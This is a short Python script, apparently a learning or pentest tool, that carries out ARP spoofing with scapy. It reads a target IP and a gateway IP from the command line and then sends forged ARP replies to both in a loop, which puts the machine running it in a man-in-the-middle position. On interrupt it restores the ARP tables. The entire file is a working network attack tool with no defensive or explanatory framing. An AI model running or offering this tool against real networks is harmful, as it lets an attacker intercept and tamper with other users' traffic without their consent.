#!usr/bin/env python3
# @INFO: run it in Python 3

from scapy.layers import all as scapy
import time
import argparse

#timeout for ARP request in seconds
timeout = 1

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Target IP address.")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP address.")
    options = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please specify target IP address. Use --help for more info.")
    if not options.gateway_ip:
        parser.error("[-] Please specify gateway IP. Use --help for more info.")
    return options

def get_mac(ip, timeout):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=timeout, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip, timeout)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip, timeout)
    source_mac = get_mac(source_ip, timeout)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

options = get_arguments()
target_ip = options.target_ip
gateway_ip = options.gateway_ip

sent_packets_count = 0
print("Spoofing started...")
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("[+] Packet sent: " + str(sent_packets_count), end='\r')
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ..... Ending of spoofing.")
    print("[+] Totally send " + str(sent_packets_count) + " packets")
    print("[+] Restoring ARP tables, please wait for a few seconds")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[+] Done")
